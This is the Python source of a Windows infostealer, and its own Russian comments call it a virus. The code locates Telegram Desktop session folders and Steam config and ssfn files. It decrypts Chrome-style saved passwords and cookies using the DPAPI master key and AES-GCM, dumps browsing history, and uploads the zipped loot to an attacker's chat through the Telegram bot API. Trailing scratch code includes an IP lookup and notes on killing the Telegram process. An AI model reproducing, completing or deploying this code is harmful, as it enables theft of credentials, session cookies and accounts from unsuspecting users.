import base64, datetime, json, os, shutil, sqlite3, sys, time, requests, win32crypt
from Crypto.Cipher import AES
from config import TOKEN, CHAT_ID

url_Document = f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={CHAT_ID}'
url_text = lambda text: f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={text}'

paths_Telegram = (
    'D:\\Telegram Desktop\\tdata', 'C:\\Program Files\\Telegram Desktop\\tdata',
    os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata",
    'D:\\Programs\\Telegram Desktop\\tdata')  # папки где могут храниться данные телеграмма

directory_output = os.environ['USERPROFILE'] + r'\AppData\Local\tdata'  # где храняться файлы перед отправкой
current_user = os.getlogin()  # имя пользователя

user_path = os.path.expanduser('~')  # путь по имя пользователя (C:\\Users\\Admin)
path_to_thisFile = sys.argv[0]  # абсолютный путь файла
Thisfile_name = os.path.basename(path_to_thisFile)  # название этого файла

chrome_path = f'C:\\Users\\{current_user}\\AppData\\Roaming\\Chrome'
operagx_path = f'C:\\Users\\{current_user}\\AppData\\Roaming\\OperaGX'
steam_path = f'C:\\Users\\{current_user}\\AppData\\Local\\Steamm'
tg_path = f'C:\\Users\\{current_user}\\AppData\\Local\\tdata'

session = requests.Session()
session.headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
session.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'

steam_config_path = rf'C:\Users\{current_user}\AppData\Local\Steamm\config'

pathSsfn = (r'C:\Program Files\Steam', r'C:\Program Files (x86)\Steam', r'D:\Shop games\Steam')  # пути к папке со стимом
pathConfig = (r'C:\Program Files\Steam\config', r'C:\Program Files (x86)\Steam\config', r'D:\Shop games\Steam\config')  # пути к папке конфига стима



class Support:
    @staticmethod
    def start():
        try:
            session.post(url_text(f'{current_user} запустил вирус, ожидаем...'))
        except:
            pass
        try:
            os.makedirs(chrome_path)
            os.makedirs(operagx_path)
            os.makedirs(steam_path)
        except:
            pass

    @staticmethod
    def send_data(data, name):
        try:
            session.post(url_Document, files={"document": (f'{name}({current_user}).zip', data)})
        except:
            pass

    @staticmethod
    def send_error(name):
        try:
            session.post(url_text('Пользователь: ' + current_user + f' не имеет {name}'))
        except:
            pass

    @staticmethod
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    @staticmethod
    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    @staticmethod
    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = Support.generate_cipher(master_key, iv)
            decrypted_pass = Support.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Can't decode"

    @staticmethod
    def get_master_key(path):
        """ получаем мастер пароль """
        with open(user_path + path, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])  # находим защифрованный ключ
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    @staticmethod
    def decrypt(buff, master_key):
        try:
            return AES.new(master_key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Can't decode"

    @staticmethod
    def normal_time(date):
        """ приводим полученное время в нормальный вид """
        try:
            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=date))
        except:
            return "Can't decode"



class Data:
    @staticmethod
    def History(cursor, history):
        """ возвращает историю """
        HistorySQL = "SELECT url FROM visits"
        HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"

        temp = []
        for result in cursor.execute(HistorySQL).fetchall():
            data = cursor.execute(HistoryLinksSQL % result[0]).fetchone()
            result = f"URL: {data[0]}\nTitle: {data[1]}\nLast Visit: {Support.normal_time(data[2])}\n\n"
            if result in temp:
                continue
            temp.append(result)
            history.write(result)

    @staticmethod
    def cookies(cursor, path, path_to_save):
        """ возвращает куки """
        CookiesSQL = "SELECT * FROM cookies"

        results = '[\n'
        for result in cursor.execute(CookiesSQL).fetchall():
            secure = result[8] == 0
            http = result[9] == 0

            results += '''
	{
		"domain": "%s",
		"expirationDate": %s,
		"name": "%s",
		"httpOnly": %s,
		"path": "%s",
		"secure": %s,
		"value": "%s"
	},
			''' % (result[1], result[7], result[3], http, result[6], secure,
                   Support.decrypt(result[5], Support.get_master_key(path)))

        with open(user_path + path_to_save, "w", encoding="utf-8") as cookies:
            results = results.replace('True', 'true')
            results = results.replace('False', 'false')
            results = results.replace('""', '"')
            results = results[:-1] + '\n]'
            cookies.write(results)









if __name__ == '__main__':
    ...


resp = requests.get('https://ipinfo.io/107.182.142.142').json()
print(resp)
a = {'ip': '188.162.173.196', 'hostname': 'client.yota.ru', 'city': 'Rostov-na-Donu', 'region': 'Rostov', 'country': 'RU',
     'loc': '47.2313,39.7233', 'org': 'AS31163 PJSC MegaFon', 'postal': '344000', 'timezone': 'Europe/Moscow',
     'readme': 'https://ipinfo.io/missingauth'
}


# написать скрипт для отстановки процессов | обнова для вируса может быть

# через pid, плохой способ
# pid = 4388 # telegram
# 9 - Сигнал 9 является стандартным сигналом для завершения процесса, и он не может быть перехвачен или проигнорирован завершаемым процессом.
# os.kill(pid, 9)

# import psutil
#
# name_proces = 'telegram'
# for process in psutil.process_iter():
#     print(process)
#     # try:
#     #     if process == name_proces:
#     #         process.kill()
#     # except: pass
